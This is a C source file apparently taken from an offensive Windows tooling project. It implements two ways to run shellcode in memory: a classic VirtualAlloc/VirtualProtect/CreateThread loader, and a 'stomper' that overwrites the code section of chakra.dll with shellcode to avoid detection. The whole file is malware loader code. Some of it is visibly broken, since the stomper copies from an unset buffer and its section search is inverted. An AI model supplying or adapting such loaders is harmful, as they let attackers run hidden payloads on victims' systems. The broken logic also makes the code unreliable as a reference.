#include <windows.h>

#include <macros.h>

VOID Classic( 
    PVOID  ShellcodeBytes,
    UINT64 ShellcodeSize 
);

VOID Stomper( 
    PVOID  ShellcodeBuffer,
    UINT64 ShellcodeSize
);

VOID LocalInjection(
    PVOID  ShellcodeBytes,
    UINT64 ShellcodeSize
) {
#ifdef INJECTION_STOMPER
   Stomper( ShellcodeBytes, ShellcodeSize );
#endif
#ifdef INJECTION_CLASSIC
   Classic( ShellcodeBytes, ShellcodeSize );
#endif
}

#ifdef INJECTION_STOMPER

VOID Stomper( 
    PVOID  ShellcodeBuffer,
    UINT64 ShellcodeSize
) {

    PVOID                 MmBase   = { 0 };
    PIMAGE_NT_HEADERS     Header   = { 0 };
    PIMAGE_SECTION_HEADER SecHdr   = { 0 };
    NTSTATUS              Status   = { 0 };
    ULONG                 Protect  = { 0 };
    PVOID                 Buffer   = { 0 };
    ULONG                 Length   = { 0 };
    HANDLE                Thread   = { 0 };

    //
    // load shellcode into memory
    //
    printf( "[*] shellcode @ %p [%ld bytes]\n", Buffer, Length );

    if ( ! ( MmBase = LoadLibraryExA( "chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES ) ) ) {
        printf( "[!] LoadLibraryA Failed: %ld\n", GetLastError() );
        goto END;
    } else printf( "[*] loaded \"chakra.dll\" @ %p\n", MmBase );

    Header = C_PTR( U_PTR( MmBase ) + ( ( PIMAGE_DOS_HEADER ) MmBase )->e_lfanew );

    SecHdr = IMAGE_FIRST_SECTION( Header );
    for ( ULONG i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        if ( strcmp( C_PTR( SecHdr[ i ].Name ), ".text" ) ) {
            break;
        }
    }

    MmBase = (UINT64)(MmBase) + SecHdr->VirtualAddress;

    printf( "[*] target code section @ %p [%ld bytes]\n", MmBase, SecHdr->SizeOfRawData );

    if ( ! VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, & Protect ) ) {
        printf( "[!] VirtualProtect Failed: %ld\n", GetLastError() );
        goto END;
    }

    MmCopy( MmBase, Buffer, Length );

    if ( ! VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, &Protect ) ) {
        printf( "[!] VirtualProtect Failed: %ld\n", GetLastError() );
        goto END;
    }

    puts( "[*] wrote shellcode into target module" );
    printf( "[*] press enter..." );
    getchar();

    if ( ! ( Thread = CreateThread( NULL, 0, MmBase, NULL, 0, NULL ) ) ) {
        printf( "[*] CreateThread Failed: %ld\n", GetLastError() );
        goto END;
    }

    WaitForSingleObject( Thread, INFINITE );

END:
    if ( Thread ) {
        CloseHandle( Thread );
        Thread = NULL;
    }

    return 0;
}
#endif

#ifdef INJECTION_CLASSIC

VOID Classic( 
    PVOID  ShellcodeBytes,
    UINT64 ShellcodeSize 
) {
    DWORD  OldProtection  = 0;
    DWORD  ThreadId       = 0;
    HANDLE TargetProcess  = 0;

    LPVOID  ShellcodeMemory = NULL;

    ShellcodeMemory = VirtualAlloc( NULL, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );

    if ( ! ShellcodeMemory )
    {
        printf("[-] Failed to allocate Virtual Memory\n");
        return 0;
    }

    printf( "[*] Address => %p [%d bytes]\n", ShellcodeMemory, ShellcodeSize );

    MmCopy( ShellcodeMemory, ShellcodeBytes, ShellcodeSize );

    VirtualProtect( ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );

    puts("[+] Execute shellcode... press enter");
    getchar();

    WaitForSingleObject( CreateThread( NULL, NULL, ShellcodeMemory, NULL, NULL, NULL ), INFINITE ); //((ShellcodeMain)ShellcodeMemory)();
    printf( "[+] Running in thread id: %d\n", ThreadId ); 
}

#endif